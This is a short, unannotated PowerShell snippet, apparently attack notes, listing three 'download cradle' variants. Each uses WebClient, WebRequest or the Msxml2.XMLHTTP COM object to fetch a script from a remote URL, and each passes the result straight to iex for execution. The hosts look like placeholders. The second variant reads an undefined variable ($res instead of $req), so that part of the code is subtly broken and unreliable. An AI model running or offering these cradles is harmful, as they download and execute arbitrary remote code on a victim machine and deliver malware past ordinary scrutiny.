iex (New-Object Net.Webclient).DownloadString("http://wp.pl.ps1")


$req = [System.Net.WebRequest]::Create("http://blabla.pl/script.gif")
$req = $req.GetResponse()
iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()


$downloader = New-Object -ComObject Msxml2.XMLHTTP
$downloader.open("GET", "http://blaba.spript.gif", $false)
$downloader.send()
iex $downloader.responseText